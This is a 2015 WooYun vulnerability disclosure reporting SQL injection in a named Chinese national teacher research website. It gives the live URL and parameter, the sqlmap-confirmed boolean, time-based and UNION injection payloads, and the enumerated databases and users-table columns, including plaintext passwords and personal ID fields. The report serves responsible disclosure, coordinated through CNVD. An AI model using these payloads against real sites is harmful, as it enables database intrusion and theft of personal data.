wybug_title: 国家教师科研网主站存在sql注入漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-08-05：	细节已通知厂商并且等待厂商处理中									2015-08-07：	厂商已经确认，细节仅向厂商公开									2015-08-17：	细节向核心白帽子及相关领域专家公开									2015-08-27：	细节向普通白帽子公开									2015-09-06：	细节向实习白帽子公开									2015-09-21：	细节向公众公开  简要描述： 向伟大的人民教师致敬，作为国家级的教师科研网站，存在sql注入漏洞可不好 详细说明：  注入URL:
www.chcei.org/list_news.php?news_id=1409
sqlmap判定：
Parameter: news_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: news_id=1409' AND 2629=2629 AND 'ZYDu'='ZYDu    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: news_id=1409' AND (SELECT * FROM (SELECT(SLEEP(5)))FGXS) AND 'zGnQ'='zGnQ    Type: UNION query    Title: Generic UNION query (NULL) - 30 columns    Payload: news_id=1409' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767171,0x746543514b5171656962,0x7176766271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---[INFO] the back-end DBMS is MySQLweb application technology: Apache 2.2.8, PHP 5.2.5back-end DBMS: MySQL 5.0.12

available databases [8]:[*] dongfang[*] eehua[*] eehua2[*] information_schema[*] mysql[*] test[*] yanyuan[*] zhongjiao

current database:    'zhongjiao'

current user:    'root@localhost'



Database: zhongjiao[8 tables]+------------+| aplication || bbs        || bbs_users  || connto     || guanggao   || news       || newstype   || users      |+------------+

Database: zhongjiaoTable: users[26 columns]+-------------+--------------+| Column      | Type         |+-------------+--------------+| Position    | varchar(20)  || Address     | varchar(50)  || Brith       | varchar(20)  || ClearPasswd | varchar(20)  || Code        | int(11)      || Com_Name    | varchar(50)  || Create_Time | datetime     || Detail      | varchar(200) || Email       | varchar(20)  || EnPassWord  | varchar(50)  || Fex         | varchar(20)  || Mob         | varchar(16)  || My_Local    | varchar(22)  || Name        | varchar(20)  || Num         | int(11)      || PassWord    | varchar(50)  || Person_Num  | varchar(22)  || QiTa        | varchar(50)  || Regist_Num  | varchar(20)  || Scodes      | int(11)      || Sex         | varchar(4)   || Tel         | varchar(20)  || Umail       | varchar(50)  || Up_Date     | date         || UserType    | int(1)       || Xingqu      | varchar(200) |+-------------+--------------+


   漏洞证明：  
Parameter: news_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: news_id=1409' AND 2629=2629 AND 'ZYDu'='ZYDu    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: news_id=1409' AND (SELECT * FROM (SELECT(SLEEP(5)))FGXS) AND 'zGnQ'='zGnQ    Type: UNION query    Title: Generic UNION query (NULL) - 30 columns    Payload: news_id=1409' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767171,0x746543514b5171656962,0x7176766271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---[INFO] the back-end DBMS is MySQLweb application technology: Apache 2.2.8, PHP 5.2.5back-end DBMS: MySQL 5.0.12
   修复方案：  过滤   版权声明：转载请注明来源 pomelo@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-07 13:44 厂商回复： CNVD确认并复现所述情况，已由CNVD通过软件生产厂商（或网站管理方）公开联系渠道向其邮件（和电话）通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无
